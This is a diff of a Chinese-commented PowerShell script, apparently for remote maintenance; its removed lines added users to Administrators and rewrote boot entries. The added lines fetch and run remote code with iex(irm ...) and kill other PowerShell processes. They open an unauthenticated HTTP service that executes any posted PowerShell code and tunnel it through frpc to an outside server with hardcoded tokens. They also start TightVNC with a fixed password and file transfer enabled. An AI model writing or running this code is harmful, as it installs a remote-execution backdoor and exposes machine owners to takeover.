@@ -1,215 +1,182 @@
-$ErrorActionPreference = "Stop"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$ErrorActionPreference = 'Stop'; cd $env:temp; [Environment]::CurrentDirectory = $pwd
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# 检查当前用户是否属于管理员组
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (!$isAdmin)
-{
-	Write-Host "很遗憾! 电脑当前登陆的用户『$($env:USERNAME)』没有管理员权限, 我无法执行! `n若仍想执行, 请按如下步骤操作:`n`n1.先注销当前用户,选择『Administrator』帐户登陆;`n2.然后执行D盘下名为『__将$($env:USERNAME)用户加入管理员组.bat』的文件;`n3.重启系统,选择『$($env:USERNAME)』用户登陆;`n4.再次尝试在运行框中执行我`n`n20秒后自动退出！"
-	$cmdContent = @"
-%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit
-net localgroup Administrators "$env:USERNAME" /add
-echo "$env:USERNAME 用户, 已成功添加到管理员组!"
-"@
-	Set-Content -Path "D:\__将$($env:USERNAME)用户加入管理员组.bat" -Value $cmdContent
-    sleep 20
-    exit
-}
+iex(irm https://cnb.cool/GHFXJ/PS/-/git/raw/main/Func/.utils.ps1)
 
-function downloadFiles
-{
-    param (
-        [Parameter(Mandatory = $true)]
-        [array]$files
-    )
-    
-    function DownloadFileFromUrl
-    {
-        param (
-            [string]$url,
-            [string]$outputPath
-        )
-        try
-        {
-            Write-Host "正在从 $url 下载..."
-            (New-Object System.Net.WebClient).DownloadFile($url, $outputPath)
-            return $true
-        }
-        catch
-        {
-            Write-Host "从 $url 下载失败。"
-            return $false
-        }
-    }
-    
-    function VerifyFileHash
-    {
-        param (
-            [string]$filePath,
-            [string]$expectedHash
-        )
-        try
-        {
-            $stream = [System.IO.File]::OpenRead($filePath)
-            $sha256 = [System.Security.Cryptography.SHA256]::Create()
-            $computedHashBytes = $sha256.ComputeHash($stream)
-            $stream.Close()
-            $computedHash = [BitConverter]::ToString($computedHashBytes) -replace '-'
-            return $computedHash -eq $expectedHash
-        }
-        catch
-        {
-            Write-Host "文件哈希验证失败。"
-            return $false
-        }
-    }
-    
-    foreach ($file in $files)
-    {
-        $urls = $file.urls
-        $hash = $file.hash
-        $name = $file.name
-        $targDir = $file.targDir
-        
-        # 设置文件路径
-        $tempFilePath = [System.IO.Path]::Combine($targDir, $name)
-        
-        # 确保目标文件夹存在
-        if (-not (Test-Path $targDir))
-        {
-            New-Item -Path $targDir -ItemType Directory | Out-Null
-        }
+#✅ 确保 tvnserver
+Ensure-App "tvnserver", "frpc"
 
-        # 检查文件是否存在以及哈希值是否匹配
-        if (Test-Path $tempFilePath)
-        {
-            Write-Host "$name 已经存在。正在验证哈希..."
-            if (VerifyFileHash -filePath $tempFilePath -expectedHash $hash)
-            {
-                Write-Host "文件 $name 已存在且哈希匹配。跳过下载。"
+#✅1 强制结束所有 frps 进程（忽略错误，若进程不存在则继续）
+gps powershell -EA 0 | ? Id -ne $pid | kill -Force
+Stop-Process -Name frpc -Force -EA 0
+Stop-Process -Name tvnserver -Force -EA 0
+
+#✅ ===== 启动 4455 端口的 HTTP 代码执行服务（返回纯文本） =====
+# 清理可能残留的同名作业（防止端口占用）
+Get-Job -Name "HttpService4455" -ErrorAction SilentlyContinue | Stop-Job -PassThru | Remove-Job
+
+# 定义后台作业脚本块
+$httpJob = Start-Job -Name "HttpService4455" -ScriptBlock {
+    param($workingDir)
+    Set-Location $workingDir
+
+    $Port = 4455
+    $Prefix = "http://+:$Port/"
+
+    $listener = [System.Net.HttpListener]::new()
+    $listener.Prefixes.Add($Prefix)
+
+    try {
+        $listener.Start()
+        Write-Host "HTTP 服务已启动，监听端口 $Port" -ForegroundColor Green
+
+        while ($true) {
+            $context = $listener.GetContext()
+            $request = $context.Request
+            $response = $context.Response
+
+            # 仅处理 POST /execPsCode
+            if ($request.HttpMethod -ne 'POST' -or $request.Url.AbsolutePath -ne '/execPsCode') {
+                $response.StatusCode = 404
+                $response.Close()
                 continue
             }
-            else
-            {
-                Write-Host "文件 $name 已存在，但哈希不匹配。正在删除文件..."
-                Remove-Item $tempFilePath
+
+            # 必须为 JSON 格式
+            if ($request.ContentType -notlike 'application/json*') {
+                $response.StatusCode = 415
+                $response.Close()
+                continue
             }
-        }
-        
-        $downloadSuccess = $false
-        
-        foreach ($url in $urls)
-        {
-            if (DownloadFileFromUrl -url $url -outputPath $tempFilePath)
-            {
-                if (VerifyFileHash -filePath $tempFilePath -expectedHash $hash)
-                {
-                    Write-Host "文件 $name 下载并哈希验证成功。"
-                    $downloadSuccess = $true
-                    break # 跳出循环，停止尝试其他 URL
-                }
-                else
-                {
-                    Write-Host "从 $url 下载的文件哈希验证失败。"
-                }
+
+            # 读取请求体
+            $reader = [System.IO.StreamReader]::new($request.InputStream, $request.ContentEncoding)
+            $body = $reader.ReadToEnd()
+            $reader.Close()
+
+            # 解析 JSON
+            try {
+                $payload = $body | ConvertFrom-Json -ErrorAction Stop
+            } catch {
+                $errorMsg = "JSON 解析错误: $($_.Exception.Message)"
+                $bytes = [Text.Encoding]::UTF8.GetBytes($errorMsg)
+                $response.StatusCode = 400
+                $response.ContentType = 'text/plain; charset=utf-8'
+                $response.ContentLength64 = $bytes.Length
+                $response.OutputStream.Write($bytes, 0, $bytes.Length)
+                $response.OutputStream.Close()
+                continue
             }
-            else
-            {
-                Write-Host "从 $url 下载失败。"
+
+            # 必须包含 powershellCode 字段
+            if (-not $payload.powershellCode) {
+                $errorMsg = "缺少 'powershellCode' 字段"
+                $bytes = [Text.Encoding]::UTF8.GetBytes($errorMsg)
+                $response.StatusCode = 400
+                $response.ContentType = 'text/plain; charset=utf-8'
+                $response.ContentLength64 = $bytes.Length
+                $response.OutputStream.Write($bytes, 0, $bytes.Length)
+                $response.OutputStream.Close()
+                continue
             }
+
+            $code = $payload.powershellCode
+            $output = ''
+
+            # 执行传入的 PowerShell 代码
+            try {
+                # 使用 Out-String -Stream 避免格式化填充空格，再用换行符连接
+                $lines = Invoke-Expression $code 2>&1 | Out-String -Stream
+                $output = $lines -join "`r`n"
+            } catch {
+                # 捕获终止错误（如语法错误）
+                $output = "错误: $($_.Exception.Message)"
+            }
+
+            # 返回纯文本输出
+            $bytes = [Text.Encoding]::UTF8.GetBytes($output)
+            $response.StatusCode = 200
+            $response.ContentType = 'text/plain; charset=utf-8'
+            $response.ContentLength64 = $bytes.Length
+            $response.OutputStream.Write($bytes, 0, $bytes.Length)
+            $response.OutputStream.Close()
         }
-        
-        if (-not $downloadSuccess)
-        {
-            Write-Error "所有下载 $name 的尝试均失败或哈希验证失败。"
-            exit
-        }
-        
-        Write-Host "`n已下载：$($name)`n"
+    } catch {
+        Write-Host "HTTP 服务错误: $_" -ForegroundColor Red
+    } finally {
+        if ($listener.IsListening) { $listener.Stop() }
     }
-}
+} -ArgumentList $pwd
 
-# 文件列表参数
-$targDir = "$env:SystemDrive\BOOT"
-$files = @(
-	@{
-		urls = @(
-			"https://0laygw.dm.files.1drv.com/y4mp8dHdwE7AY3PS_dxsJFO3SMcDvzS7suR1LTJnMF0sy4bnovF2lbJs5lectXSZlA7BCOcyvVZu3vuwVoV2UFHPDFEwO1BrWXTDRrT9Ej7S3lA0uPAff2JAJ-SVSSUiVbGJIKeXjsTfgfE800--3exBLfW8MyrZ8nQt3Ht5TqjobWEfkuxLy6NQWkuKnB6IxXZoWbLmk1vTHTCO5PmGFNjNA"
-		)
-		hash = 'FD9C0F38DD4A75632A4F5B94DD1977660F4A6FD53AE501FCE976F430C5885724'
-		name = "BOOT.SDI"
-		targDir = $targDir
-	},
-	@{
-		urls = @(
-			"https://d4g3zw.dm.files.1drv.com/y4m6n4ynyiWxPVlx0yGkRaFrmCxD2B0CcRZXsGHoktZuiGcwojbX6_r38bbdfCU49hG3-XHaBDvrHyMNV5XeKmlzh5R4Ncyv8lw6rdexPHpjBArsbmANtyNGCxoZADL8zn-gNUvZZ42j_nXCcuAaOeb-LlssXF6ZzebCaNgxxkIAl2eZVbJdXZO5KaYidZHCW7qMVKOYYgnRkYO7MC9flVIoA" #ku
-		)
-		hash = '5D89860ECAE1A37B1C07CCBC50F7A007A83519CAD4551E72954E40D828D29E97' #ku
-		name = "BOOT.wim"
-		targDir = $targDir
-	}
-)
+# 短暂等待服务启动
+Start-Sleep -Seconds 1
 
-# 下载所有文件
-downloadFiles $files
+#✅2 定义 TOML 配置内容并保存到当前目录下的 Frps.toml 文件中
+$toml = @'
+serverAddr = "a.ghfxj.com"
+serverPort = 7000
+auth.token = "Ghfxj007"
+loginFailExit = false
+[[proxies]]
+type = "stcp"
+name = "qm4455_server"
+secretKey = "Ghfxj4455"
+localIP = "127.0.0.1"
+localPort = 4455
+[[proxies]]
+type = "stcp"
+name = "vnc5900_server"
+secretKey = "Ghfxj5900"
+localIP = "127.0.0.1"
+localPort = 5900
+'@
+[IO.File]::WriteAllText("frpc.toml", $toml)
 
-# 定义变量
-$id1 = "{e423cc21-44b3-455b-b26e-eb62211ce14a}"
-$id2 = "{5624ffff-8d96-11de-8e71-fffffffffffb}"
-$systemDrive = $env:systemDrive
-$bootSdiPath = "$systemDrive\BOOT\BOOT.sdi"
-$bootWimPath = "$systemDrive\BOOT\BOOT.wim"
+#✅3 不打开新窗口启动 frps，使用刚生成的配置文件
+Start-Process -FilePath "frpc" -ArgumentList "-c frpc.toml" -NoNewWindow -WorkingDirectory $pwd
 
-# 删除旧的引导项
-& bcdedit /delete $id1 > $null 2>&1
-& bcdedit /delete $id2 > $null 2>&1
-
-# 创建新的引导项
-& bcdedit /create $id2 /d "PE 想远程维护系统？ 先选我，再回车！" /device > $null 2>&1
-& bcdedit /set $id2 ramdisksdidevice "partition=$systemDrive" > $null 2>&1
-& bcdedit /set $id2 ramdisksdipath \BOOT\BOOT.SDI > $null 2>&1
-
-& bcdedit /create $id1 /d "PE 想远程维护系统？ 先选我，再回车！" /application osloader > $null 2>&1
-& bcdedit /set $id1 device "ramdisk=[$systemDrive]\BOOT\BOOT.wim,$id2" > $null 2>&1
-& bcdedit /set $id1 osdevice "ramdisk=[$systemDrive]\BOOT\BOOT.wim,$id2" > $null 2>&1
-
-# 检查启动模式是否为UEFI
-$bootMode = ""
-if (bcdedit /enum "{current}" | Select-String -Pattern "\.efi$") {
-    $bootMode = "UEFI"
-}
-if (bcdedit /enum "{bootmgr}" | Select-String -Pattern "\.efi$") {
-    $bootMode = "UEFI"
-}
-
-# 设置启动路径
-if ($bootMode -eq "UEFI") {
-    bcdedit /set $id1 path "\Windows\system32\boot\winload.efi" > $null 2>&1
-} else {
-    bcdedit /set $id1 path "\windows\system32\boot\winload.exe" > $null 2>&1
-}
-
-# 设置其他引导项选项
-& bcdedit /set $id1 locale zh-CN > $null 2>&1
-& bcdedit /set $id1 inherit {bootloadersettings} > $null 2>&1
-& bcdedit /set $id1 systemroot \windows > $null 2>&1
-& bcdedit /set $id1 BootMenuPolicy Legacy > $null 2>&1
-& bcdedit /set {current} BootMenuPolicy Legacy > $null 2>&1
-& bcdedit /set $id1 detecthal Yes > $null 2>&1
-& bcdedit /set $id1 winpe Yes > $null 2>&1
-& bcdedit /set $id1 ems no > $null 2>&1
-
-# 添加引导项到菜单
-& bcdedit /displayorder $id1 /addlast > $null 2>&1
-& bcdedit /timeout 5 > $null 2>&1
-
-# 创建桌面上的脚本文件，重启后进入PE
-$desk = Join-Path $env:USERPROFILE "desktop\重启后进PE.cmd"
-$cmdContent = @"
-%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit
-bcdedit /bootsequence $id1
-shutdown /r /t 1
-"@
-Set-Content -Path $desk -Value $cmdContent -Encoding ASCII
-
-bcdedit /bootsequence $id1
-shutdown /r /t 6
+# 生成 tvnv 配置文件
+$tvns = @'
+[server]
+RunControlInterface=1
+UseControlAuthentication=0
+RepeatControlAuthentication=1
+ExtraPorts=
+QueryTimeout=30
+QueryAcceptOnTimeout=0
+LocalInputPriorityTimeout=3
+LocalInputPriority=0
+BlockRemoteInput=0
+BlockLocalInput=0
+IpAccessControl=
+RfbPort=0x170c
+HttpPort=0x16a8
+DisconnectAction=0
+AcceptRfbConnections=1
+UseVncAuthentication=1
+LoopbackOnly=0
+AcceptHttpConnections=0
+LogLevel=0
+EnableFileTransfers=1
+RemoveWallpaper=1
+UseD3D=1
+UseMirrorDriver=1
+EnableUrlParams=1
+Password=C6930EB33F721FF9
+AlwaysShared=0
+NeverShared=0
+DisconnectClients=1
+PollingInterval=1000
+AllowLoopback=1
+VideoRecognitionInterval=3000
+GrabTransparentWindows=1
+SaveLogToAllUsersPath=0
+ConnectToRdp=0
+IdleTimeout=0
+VideoClasses=
+VideoRects=
+ControlPassword=C6930EB33F721FF9
+'@
+[IO.File]::WriteAllText("tvnserver.ini", $tvns)
+#✅4 启动tvnserver
+Start-Process -FilePath "tvnserver.exe" -ArgumentList "-run" -NoNewWindow -WorkingDirectory $pwd -wait
